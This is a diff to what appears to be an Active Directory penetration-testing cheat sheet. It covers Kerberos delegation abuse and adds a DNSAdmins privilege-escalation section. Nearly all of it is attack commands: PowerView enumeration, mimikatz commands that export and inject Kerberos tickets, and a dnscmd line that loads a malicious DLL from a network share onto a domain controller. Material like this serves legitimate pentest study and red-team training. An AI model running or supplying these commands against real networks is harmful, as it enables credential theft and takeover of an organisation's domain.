@@ -109,13 +109,14 @@ Invoke-Userhunter -CheckAccess : To confirm admin access
 ### Unconstrained Delegation
   
 - Discover the computers having unconstrained Delegation (Require Access to the server having unconstrained delegation)
--    Get-Netcomputer -Unconstrained 
+-     Get-Netcomputer -Unconstrained 
 - Run mimikatz to check if any domain admin ticket is available 
--    Invoke-Mimimkaz -command '"sekurlsa::tickets /export"'
+-     Invoke-Mimimkaz -command '"sekurlsa::tickets /export"'
 - The token can be reused
--    Invoke-Mimikatz -command '"kerberos::ptt ticket.kirbi"'
+-     Invoke-Mimikatz -command '"kerberos::ptt ticket.kirbi"'
  
 ### Constrained Delegation
+  
 - Enumerate Users and Computers with constrained Delegation (Requires Access to the server or user having constrained delegation)
 -     Get-DomainUser -TrustedtoAuth
 -     Get-DomainComputer -TrustedtoAuth
@@ -126,5 +127,12 @@ Invoke-Userhunter -CheckAccess : To confirm admin access
 - Using Mimikatz to inject ticket in memory
 -     Invoke-Mimikatz -command '"kerberos::ptt ticket.kirbi'"
   
+### DNS Admin
+
+- Enumerate Member of DNS Admin Group
+-     Get-NetgroupMember -GroupName "DNSAdmins"
+- Inject malicious DLL using dnscmd
+-     dnscmd dcorp-dc /config  /serverlevelplugindll \\ip\dll\mimilib.dll
   
+
 
